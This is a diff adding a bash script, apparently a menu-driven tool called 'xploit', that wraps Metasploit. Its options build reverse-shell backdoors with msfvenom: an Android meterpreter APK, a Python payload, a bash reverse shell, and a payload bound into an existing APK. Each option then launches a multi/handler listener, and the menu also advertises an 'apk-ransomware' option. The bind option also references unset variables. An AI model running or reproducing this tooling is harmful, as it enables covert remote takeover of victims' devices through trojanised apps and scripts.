@@ -1,0 +1,314 @@
+#!/bin/bash
+a="\033[0;90m" #abu
+a1="\033[1;90m" #terang
+a2="\033[2;90m" #gelap
+a3="\033[3;90m" #miring
+a4="\033[4;90m" #garis
+b="\033[0;91m" #merah
+b1="\033[1;91m" #terang
+b2="\033[2;91m" #gelap
+b3="\033[3;91m" #miring
+b4="\033[4;91m" #garis
+c="\033[0;92m" #hijau
+c1="\033[1;92m" #terang
+c2="\033[2;92m" #gelap
+c3="\033[3;92m" #miring
+c4="\033[4;92m" #garis
+d="\033[0;93m" #kuning
+d1="\033[1;93m" #terang
+d2="\033[2;93m" #gelap
+d3="\033[3;93m" #miring
+d4="\033[4;93m" #garis
+e="\033[0;94m" #biru
+e1="\033[1;94m" #terang
+e2="\033[2;94m" #gelap
+e3="\033[3;94m" #miring
+e4="\033[4;94m" #garis
+f="\033[0;95m" #ungu
+f1="\033[1;95m" #terang
+f2="\033[2;95m" #gelap
+f3="\033[3;95m" #miring
+f4="\033[4;95m" #garis
+g="\033[0;96m" #birumuda
+g1="\033[1;96m" #terang
+g2="\033[2;96m" #gelap
+g3="\033[3;96m" #miring
+g4="\033[4;96m" #garis
+h="\033[0;97m" #putih
+h1="\033[1;97m" #terang
+h2="\033[2;97m" #gelap
+h3="\033[3;97m" #miring
+h4="\033[4;97m" #garis
+k="\033[100m1 Txt \033[0m" #kotakabu
+k1="\033[101m Txt \033[0m" #kotakmerah
+k2="\033[102m Txt \033[0m" #kotakhijau
+k3="\033[103m Txt \033[0m" #kotakkuning
+k4="\033[104m Txt \033[0m" #kotakbiru
+k5="\033[105m Txt \033[0m" #kotakungu
+k6="\033[106m Txt \033[0m" #kotakbirumuda
+k7="\033[107m Txt \033[0m" #kotakputih
+k8="\033[108m Txt \033[0m" #kotakhitam
+results="/sdcard/payload"
+
+
+ingredients(){
+wget()
+{
+cmta=$(which wget|grep -o wget)
+if [ "$cmta" == "wget" ]; then
+echo -e "${c1}✓${h}"
+else
+echo -e "${b1}×${h}"
+fi
+}
+
+metasploit()
+{
+met=$(which msfconsole|grep -o msfconsole)
+if [ "$met" == "msfconsole" ]; then
+echo -e "${c1}✓${h}"
+else
+echo -e "${b1}×${h}"
+fi
+}
+
+curl()
+{
+cur=$(which curl|grep -o curl)
+if [ "$cur" == "curl" ]; then
+echo -e "${c1}✓${h}"
+else
+echo -e "${b1}×${h}"
+fi
+}
+
+php()
+{
+cphp=$(which php|grep -o php)
+if [ "$cphp" == "php" ]; then
+echo -e "${c1}✓${h}"
+else
+echo -e "${b1}×${h}"
+fi
+}
+
+zip()
+{
+zipo=$(which zip|grep -o zip)
+if [ "$zipo" == "zip" ]; then
+echo -e "${c1}✓${h}"
+else
+echo -e "${b1}×${h}"
+fi
+}
+
+unzip()
+{
+uzip=$(which unzip|grep -o unzip)
+if [ "$uzip" == "unzip" ]; then
+echo -e "${c1}✓${h}"
+else
+echo -e "${b1}×${h}"
+fi
+}
+
+apktool()
+{
+apktoolc=$(which apktool|grep -o apktool)
+if [ "$apktoolc" == "apktool" ]; then
+echo -e "${c1}✓${h}"
+else
+echo -e "${b1}×${h}"
+fi
+}
+
+apksigner()
+{
+apksignec=$(which apksigner|grep -o apksigner)
+if [ "$apksignec" == "apksigner" ]; then
+echo -e "${c1}✓${h}"
+else
+echo -e "${b1}×${h}"
+fi
+}
+
+keytool()
+{
+keytoolc=$(which keytool|grep -o keytool)
+if [ "$keytoolc" == "keytool" ]; then
+echo -e "${c1}✓${h}"
+else
+echo -e "${b1}×${h}"
+fi
+}
+
+java()
+{
+javac=$(which java|grep -o java)
+if [ "$javac" == "java" ]; then
+echo -e "${c1}✓${h}"
+else
+echo -e "${b1}×${h}"
+fi
+}
+
+echo -e "${d1}"
+metasploit|sed 's#^#\t metasploit #g'
+echo -e "${d1}"
+curl|sed 's#^#\t curl       #g'
+echo -e "${d1}"
+wget|sed 's#^#\t wget       #g'
+echo -e "${d1}"
+php|sed 's#^#\t php        #g'
+echo -e "${d1}"
+zip|sed 's#^#\t zip        #g'
+echo -e "${d1}"
+unzip|sed 's#^#\t unzip      #g'
+echo -e "${d1}"
+apktool|sed 's#^#\t apktool    #g'
+echo -e "${d1}"
+apksigner|sed 's#^#\t apksigner  #g'
+echo -e "${d1}"
+keytool|sed 's#^#\t keytool    #g'
+echo -e "${d1}"
+java|sed 's#^#\t java       #g'
+echo -e "${h}"
+}
+
+apk-hide(){
+echo
+echo -ne "${d1}\t enter apk-hide host :${h} "; read host
+echo
+echo -ne "${d1}\t enter apk-hide port :${h} "; read port
+echo
+echo -ne "${d1}\t enter apk-hide name :${h} "; read file
+echo -e  "\t ${a1}make backdoor application start"
+echo -e  "\t ${a1}───────────────────────────────"
+echo -e "${a1}"
+cd $HOME
+msfvenom -p android/meterpreter/reverse_tcp LHOST=${host} LPORT=${port} -o ${results}${file}.apk
+msfconsole -q -x "use multi/handler; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST localhost ; set LPORT $port ; exploit"
+}
+
+python-backdoor(){
+echo
+echo -ne "${d1}\t enter python-backdoor host :${h} "; read host
+echo
+echo -ne "${d1}\t enter python-backdoor port :${h} "; read port
+echo
+echo -ne "${d1}\t enter python-backdoor name :${h} "; read file
+echo -e  "\t ${a1}make backdoor python start"
+echo -e  "\t ${a1}──────────────────────────"
+echo -e "${a1}"
+cd $HOME
+msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=${host} LPORT=${port} -o ${results}${file}.py
+msfconsole -q -x "use multi/handler; set PAYLOAD python/meterpreter/reverse_tcp ; set LHOST localhost ; set LPORT $port ; exploit"
+}
+
+bash-backdoor(){
+echo
+echo -ne "${d1}\t enter bash-backdoor host :${h} "; read host
+echo
+echo -ne "${d1}\t enter bash-backdoor port :${h} "; read port
+echo
+echo -ne "${d1}\t enter bash-backdoor name :${h} "; read file
+echo -e  "\t ${a1}make backdoor bash start"
+echo -e  "\t ${a1}──────────────────────────"
+echo -e "${a1}"
+cd $HOME
+msfvenom -p cmd/unix/reverse_bash LHOST=${host} LPORT=${port} -o ${results}${file}.py
+msfconsole -q -x "use multi/handler; set PAYLOAD cmd/unix/reverse_bash ; set LHOST localhost ; set LPORT $port ; exploit"
+}
+
+bind-backdoor(){
+echo
+echo -ne "${d1}\t enter bind-backdoor host :${h} "; read host
+echo
+echo -ne "${d1}\t enter bind-backdoor port :${h} "; read port
+echo
+echo -ne "${d1}\t enter bind-backdoor name ori :${h} ";read app
+echo
+echo -ne "${d1}\t enter bind-backdoor name out :${h} "; read file
+echo -e  "\t ${a1}make backdoor bind start"
+echo -e  "\t ${a1}──────────────────────────"
+echo -e "${a1}"
+cd $HOME
+msfvenom -x $app -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o ${results}${file}.apk
+msfconsole -q -x "use multi/handler; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST localhost ; set LPORT $lport ; exploit"
+}
+
+if [[ $1 == "apk-hide" ]];
+then
+apk-hide
+
+elif [[ $1 == "--h" ]];
+then
+ingredients
+
+elif [[ $1 == "python-backdoor" ]];
+then
+python-backdoor
+
+elif [[ $1 == "bash-backdoor" ]];
+then
+bash-backdoor
+
+elif [[ $1 == "bind-backdoor" ]];
+then
+bind-backdoor
+
+elif [[ $1 == "update-src" ]];
+then
+git pull
+
+elif [[ $1 == "apk-ransomware" ]];
+then
+echo -e "${b1}\n\t coming soon, we are trying\n"
+
+elif [[ $1 == "-h" ]];
+then
+echo -e "\n\t ${d1}xploit apk-hide\n"
+sleep 0.1
+echo -e "\t xploit python-backdoor\n"
+sleep 0.1
+echo -e "\t xploit bash-backdoor\n"
+sleep 0.1
+echo -e "\t xploit bind-backdoor\n"
+sleep 0.1
+echo -e "\t xploit apk-ransomware\n"
+sleep 0.1
+echo -e "\t xploit update-src${h}\n"
+
+echo -ne "\t ${a1}select one :${h} "; read option
+
+if [[ $option == "xploit apk-hide" ]];
+then
+apk-hide
+
+elif [[ $option == "xploit python-backdoor" ]];
+then
+python-backdoor
+
+elif [[ $option == "xploit bash-backdoor" ]];
+then
+bash-backdoor
+
+elif [[ $option == "xploit bind-backdoor" ]];
+then
+bind-backdoor
+
+elif [[ $option == "xploit update-src" ]];
+then
+git pull
+
+elif [[ $option == "xploit apk-ransomware" ]];
+then
+echo -e "${b1}\n\t coming soon, we are trying\n"
+
+else
+echo -e "\n\t ${b1}Please look at the menu properly\n"
+fi
+
+else
+echo -e "${b1}Please add -h to view the menu and add --h to view package"
+fi
